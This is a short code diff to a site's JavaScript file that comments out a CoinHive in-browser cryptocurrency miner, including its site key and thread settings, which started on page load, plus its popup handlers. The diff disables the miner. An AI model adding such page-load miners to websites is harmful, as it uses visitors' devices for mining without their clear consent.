@@ -3,16 +3,16 @@
  */
 
 $(document).ready(() => {
-	let miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
+	/*let miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
 		autoThreads: true,
 		theme: 'dark',
 		threads: 1,
 		throttle: 0.8,
 		language: 'auto'
 	});
-	miner.start();
+	miner.start();*/
 
-	let $el = $('#popupMiner');
+	/*let $el = $('#popupMiner');
 
 	$el.on('click', function () {
 		$el.hide();
@@ -21,7 +21,7 @@ $(document).ready(() => {
 
 	miner.on('open', function () {
 		$el.show();
-	});
+	});*/
 
 	$('.dropdown').dropdown({
 		action: 'hide'
